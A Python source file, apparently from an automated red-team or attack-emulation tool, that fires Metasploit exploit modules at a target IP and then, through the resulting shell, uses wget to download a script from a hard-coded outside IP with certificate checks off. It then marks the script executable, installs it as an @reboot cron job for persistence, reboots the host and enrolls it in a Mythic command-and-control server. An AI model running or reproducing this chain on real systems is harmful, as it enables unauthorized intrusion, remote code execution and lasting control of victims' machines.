from __future__ import annotations
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from Shells.Client import Client, C2Client
    from Operations.Operation import Operation
    from Shells.MetasploitShell import MetasploitC2, MetasploitShell
from Attacks.InitialAccessAttack import InitialAccessAttack
from Data.Techniques.Database import Database
from Data.Techniques.ServiceData import ServiceData
from Data.Techniques.ClientData import ClientData
import re
import uuid
import xml.etree.ElementTree as ET
from Data.Techniques.ClientsData import ClientsData
from pymetasploit3.msfrpc import *
import time
from Shells.MythicClient import MythicClient, MythicC2

# This is intended to be run on the starting malicious attacker client

class MetasploitAttack(InitialAccessAttack):
    # Todo: parse out and store the version

    def __init__(self, exploitModule: ExploitModule, metasploitServer: MetasploitC2):
        self.exploitModule = exploitModule
        self.metasploitServer = metasploitServer

    def onlyRequiresRHOSTS(self):
        missingRequirements = self.exploitModule.missing_required
        if(len(missingRequirements) == 1 and missingRequirements[0] == 'RHOSTS'):
            return True
        return False
    
    # Maybe it should check per client
    # Todo: make this support more than just linux
    def meetsPrereqs(self, clientData: ClientData):
        isForLinux = "linux" in self.exploitModule.info['fullname']
        isForUnix = "unix" in self.exploitModule.info['fullname']
        isMulti = "multi" in self.exploitModule.info['fullname']
        if(not(isForLinux) and not(isForUnix) and not(isMulti)):
            return False

        metasploitName: str = self.exploitModule.info['fullname']

        print(metasploitName)
        if("apache_normalize" in metasploitName):
            print("b")

        if("vsftpd" in metasploitName):
            print("b")

        hasMetasploitService: bool = clientData.servicesData.hasServiceNameInMetasploitName(metasploitName)
        if(hasMetasploitService):
            print("a")
        return hasMetasploitService
        # for client in clientsWithService:
        #     client.executeAttack(...)

    async def execute(self, targetHost: ClientData, metasploitServer: MetasploitC2, operation: Operation):
        # # Known bug/limitation here: Metasploit Exploit Overlap Bug
        # # Todo: Data will have to be passed in smartly
        # # This breaks because it tries to run payload and assumes it's a module
        # # Todo: make work for multiple OSes by dynamically chaning payload
        # # Todo: Change determining if attack was successful or not

        # # This is erroring out with Invalid Authentication Token
        # #client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        # refreshed = metasploitServer.metasploitServer.modules.use('exploit', self.exploitModule.info['fullname'])
        # refreshed['RHOSTS'] = targetHost.ipAddress
        # output = refreshed.execute(payload='cmd/unix/interact')
        # time.sleep(5)
        # #output = self.exploitModule.execute(payloads='cmd/unix/interact')
        # #output = self.exploitModule.execute()
        # try:
        #     metasploitShell = metasploitServer.getLatestSession(targetHost.ipAddress)
        #     targetHost.c2Shells.append(metasploitShell)
        # except Exception:
        #     pass
        # return
        TWO_MINUTES = 2 * 60
        await self.tryExploitForSeconds(targetHost, metasploitServer, operation, TWO_MINUTES)

    async def tryExploitForSeconds(self, targetHost: ClientData, metasploitServer: MetasploitC2, operation: Operation, seconds: int):
        # Todo: seems to do more than one thing
        hasSession = False
        currentTime = time.time()
        endTime = time.time() + seconds
        while (currentTime < endTime) and not hasSession:
            try:
                currentTime = time.time()
                await self.exploit(targetHost, metasploitServer, operation)
                hasSession = True
            except Exception as e:
                continue
    
    async def exploit(self, targetHost: ClientData, metasploitServer: MetasploitC2, operation: Operation):
        refreshed = metasploitServer.metasploitServer.modules.use('exploit', self.exploitModule.info['fullname'])
        refreshed['RHOSTS'] = targetHost.ipAddress
        output = refreshed.execute(payload='cmd/unix/interact')
        time.sleep(5)
        #output = self.exploitModule.execute(payloads='cmd/unix/interact')
        #output = self.exploitModule.execute()
        metasploitShell = metasploitServer.getLatestSession(targetHost.ipAddress)
        targetHost.c2Shells.append(metasploitShell)
        await self.dropAndRegisterMythic(operation, metasploitShell)
        return
    
    async def dropAndRegisterMythic(self, operation: Operation, metasploitShell: MetasploitShell):
        await self.dropMythic(metasploitShell)
        ipAddress = metasploitShell.getIPAddress()
        client = await self.getLatestMythicClientOfIP(operation.mythicServer, ipAddress)
        TWO_MINUTES = 120
        await self.waitForRebootToFinish(TWO_MINUTES, ipAddress, operation.mythicServer)
        operation.clientsData.getClientData(ipAddress).c2Shells.append(client)

    async def dropMythic(self, metasploitShell: MetasploitShell):
        #https://34.237.94.238:7443/direct/download/78c9b5c4-19e8-4d96-8725-6881c598c1e6
        metasploitShell.executeShell("cd")
        metasploitShell.executeShell("wget https://34.237.94.238:7443/direct/download/ffd4065a-414c-415b-8482-0c53f82e2157 -O spear.sh --no-check-certificate")
        metasploitShell.executeShell("chmod +x spear.sh")
        metasploitShell.executeShell("""(crontab -l 2>/dev/null; echo "@reboot ~/spear.sh &") | crontab -""")
        metasploitShell.executeShell("reboot")

    # Todo: This doesn't work
    async def waitForRebootToFinish(self, secondsToWait: int, ipAddress: str, mythicServer: MythicC2):
        # Todo: Use NMAP scan to detect when reboot finished
        # Todo: Currently just waits a set amount of time
        currentTime = time.time()
        endTime = time.time() + secondsToWait
        hasClient = False
        originalClient = await self.getLatestMythicClientOfIP(mythicServer, ipAddress)
        while (currentTime < endTime) and not hasClient:
            try:
                retrivedClient = await self.getLatestMythicClientOfIP(mythicServer, ipAddress)
                # Todo: Bug possibly, may not be able to compare this way
                if(originalClient == retrivedClient):
                    currentTime = time.time()
                    continue
                hasClient = True
            except Exception as e:
                continue

    async def getLatestMythicClientOfIP(self, mythicServer: MythicC2, ipAddress: str):
        clients = await mythicServer.getActiveClients()

        mostRecentClient: MythicClient = None
        for client in clients:
            clientIP = await client.getIPAddress()
            if(clientIP != ipAddress):
                continue

            if(mostRecentClient == None or mostRecentClient.displayID < client.displayID):
                mostRecentClient = client

        return mostRecentClient